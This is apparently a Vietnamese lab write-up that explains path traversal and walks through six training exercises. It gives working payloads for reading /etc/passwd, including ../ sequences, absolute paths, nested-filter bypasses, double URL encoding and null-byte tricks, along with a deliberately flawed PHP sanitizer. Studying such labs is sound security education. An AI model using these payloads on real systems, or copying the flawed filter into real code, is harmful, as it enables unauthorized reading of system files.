# Nhận biết và cách khai thác
![image](https://hackmd.io/_uploads/r1_DgQ1D-l.png)
### Định nghĩa
- **Path Traversal** (hay Directory Traversal) là lỗ hổng cho phép kẻ tấn công thoát khỏi thư mục được phép để truy cập trái phép các file hoặc thư mục khác trên hệ thống
- So sánh Path Traversal với LFI:
- - Path Traversal: kiểm soát đường dẫn → truy cập file trái phép (thường là đọc)

- - LFI: kiểm soát include file → có thể đọc file và CÓ THỂ RCE nếu include được file chứa code

### Nhận biết 
-- Tham số tên file khả nghi: filename, path, file, image, ...

-- Chức năng đọc file (image, download, log, export)

-- Output trả về nội dung file

$\implies$ Response là ảnh, không phải HTML/PHP output
 
 - Ví dụ: 
```html!
<img src="/loadImage?filename=123.png">
<img src="/assets?file=logo.png">
<video src="/media?path=movie.mp4">
```

### Cách khai thác
-- Sử dụng directory traversal sequence
(chuỗi duyệt thư mục):  `../`
> `./`: thư mục hiện tại

-- Sử dụng đường dẫn tuyệt đối

-- Path normalization: `....//`, `..././`, ...

-- URL encoding, Double URL encoding: `%2e%2e%2f`, `%252e%252e%252f`

-- Kết hợp dấu `/` và `\` (Windows)

-- Null byte

# Lab 01
![image](https://hackmd.io/_uploads/ryodgL1v-x.png)
-- Bài đầu tiên khá đơn giản, tìm đến chức năng hiển thị ảnh sản phẩm

-- Mở một ảnh bất kì trong tab mới, tìm đến param khả nghi:
![image](https://hackmd.io/_uploads/HJfVWU1Dbx.png)
```
https://0a72000e038c5de782ce1a2900e00036.web-security-academy.net/image?filename=6.jpg
```
-- Thực hiện khai thác PT vào param `filename`:

```
/image?filename=../../../etc/passwd
```
![image](https://hackmd.io/_uploads/BkQOGIkwbg.png)

# Lab 02
![image](https://hackmd.io/_uploads/rJ9eX8yD-l.png)
-- Tiếp tục khai thác với chức năng hiển thị ảnh của sản phẩm, nhưng lần này ta khai thác bằng absolute path

-- Backend KHÔNG hề ép file vào thư mục cố định

-- Đi thẳng tới file cần đọc và lấy dữ liệu
```
/image?filename=/etc/passwd
```
![image](https://hackmd.io/_uploads/rkUHBI1v-g.png)

# Lab 03
![image](https://hackmd.io/_uploads/SkIRUIJw-g.png)
-- Server đã loại bỏ chuỗi duyệt thư mục `../` một cách không đệ quy (1 lần duy nhất) trong toàn bộ giá trị của biến `filename`

-- Giả thuyết backend như sau:

```php!
<?php
$filename = $_GET['file'];

// dev nghĩ là chặn ../ là xong
$filename = str_replace("../", "", $filename);

$base_dir = "/var/www/images/";
$path = $base_dir . $filename;

readfile($path);
```
-- Cứ gặp chuỗi `../` là thay thế bằng chuỗi rỗng

```
/image?filename=..././..././..././etc/passwd
```
![image](https://hackmd.io/_uploads/rkRbcI1w-l.png)

# Lab 04
![image](https://hackmd.io/_uploads/Bk8I981DWx.png)
-- Bài này sử dụng một lớp URL-decode trước khi đem vào backend để xử lí

-- Ta chỉ việc URL-encode một lần kí tự đặc biệt `/` trước khi gửi qua tham số `filename`

- `/` --> `%25%32%46`
- `../../../` --> `..%25%32%46..%25%32%46..%25%32%46`

-- > `filename=..%25%32%46..%25%32%46..%25%32%46etc/passwd`
![image](https://hackmd.io/_uploads/ByXPaLJPbl.png)

# Lab 05
![image](https://hackmd.io/_uploads/B15fKF1PWx.png)

-- Trong bài này, đường dẫn được yêu cầu phải bắt đầu với thư mục nhất định

-- Mò xem thư mục nào được chấp nhận và từ đó lùi dần về thư mục gốc

#### Khai thác

-- Bài đã khá hào phóng khi cho ta biết luôn thư mục bắt đầu của đường đẫn 😅😄:
```
/image?filename=/var/www/images/52.jpg
```
-- Từ đây chỉ việc lùi về thư mục root và đọc file `/etc/passwd`:
```
/image?filename=/var/www/images/../../../etc/passwd 
```
![image](https://hackmd.io/_uploads/rk4PqYyDZx.png)

# Lab 06
![image](https://hackmd.io/_uploads/rJQ_ityw-g.png)
-- Lab này sử dụng whitelist khi bắt buộc tên file phải kết thúc với extension nhất định

$\implies$ Khai thác null byte
 
-- Một vài trường hợp:
- `\x00`   (hex)
- `\0`     (C-style)
- `%00`    (URL-encoded)

 -- *Tầng ứng dụng (PHP, Java, Python,...) xử lý string, nhận thấy .jpg, .png và cho qua. Nhưng tầng hệ thống (filesystem, OS) lại coi `\x00`, `\0`, `%00` là kết thúc và bỏ qua extension đằng sau*
 
 -- Ta có đường dẫn:
 ```
 /image?filename=../../../etc/passwd%00.jpg
 ```
 hoặc 
 ```
 /image?filename=../../../etc/passwd%00.png
 ```
 ![image](https://hackmd.io/_uploads/rk__k9JPZe.png)

